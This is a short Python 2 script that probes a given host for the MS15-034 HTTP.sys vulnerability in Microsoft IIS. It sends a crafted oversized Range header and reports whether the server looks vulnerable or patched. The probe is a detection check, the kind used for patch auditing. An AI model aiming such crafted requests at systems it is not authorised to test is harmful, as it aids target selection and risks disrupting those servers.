import sys
import httplib
# @psc4re based on based on script from billbillthebillbill
#usage ./MS15-034-detect.py <<IP>>
def main():	 
	ipAddr = sys.argv[1]
	hexAllFfff = "18446744073709551615" 
	req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n" 
	print "[*] "+ipAddr,
	conn = httplib.HTTPSConnection(sys.argv[1])
	try:
		conn.request("HEAD", "/")
		res = conn.getresponse()
		headerresp = str(res.getheaders())
		if "Microsoft" not in headerresp:
		                print "[*] Not IIS",
		                exit(0)
	except:
		pass
	try:
		conn = httplib.HTTPSConnection(sys.argv[1])
		conn.request(req, "/")
		res = conn.getresponse()
		newResp =str(res.read())
		if "Error 416" in newResp:
		                print ": VULNERABLE"
		elif " The request has an invalid header name" in newResp:
		                print ": Looks Patched"
		else:
		                print ": Unexpected response, cannot discern patch status"
	except:
		pass
if __name__ == "__main__":
   main()	
